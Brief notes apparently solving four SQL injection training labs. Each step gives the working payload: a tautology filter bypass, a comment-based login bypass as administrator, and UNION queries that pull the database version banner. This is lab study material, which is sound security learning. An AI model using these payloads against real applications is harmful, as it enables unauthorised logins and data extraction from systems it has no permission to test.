Lab-1:  To display one or more unreleased products. 
        
        > access the lab and choose any category and inspect the new web page.
        > edit and resend the request by changing the category as,
                category= ' or 1=1-- 
        > the lab is solved.

Lab-2:  Perform a SQL injection attack that logs in to the application as the administrator user.

        > access the lab and go to my account.
        > enter username as,
                username = administrator' --  
        > the lab is solved.

Lab-3:  Use a UNION attack to retrieve the results from an injected query. 

        > access the lab and choose any category and inspect the new web page.
        > edit and resend the request by changing the category as,
                category= ' UNION SELECT BANNER,NULL FROM v$version--      ( banner is a in-built column in oracle ) 
        > the lab is solved.

Lab-4:  Use a UNION attack to retrieve the results from an injected query.

        > access the lab and choose any category and inspect the new web page.
        > edit and resend the request by changing the category as, 
                category= ' UNION SELECT @@version, NULL--              ( @@version is an in-built variable )
        > the lab is solved. 


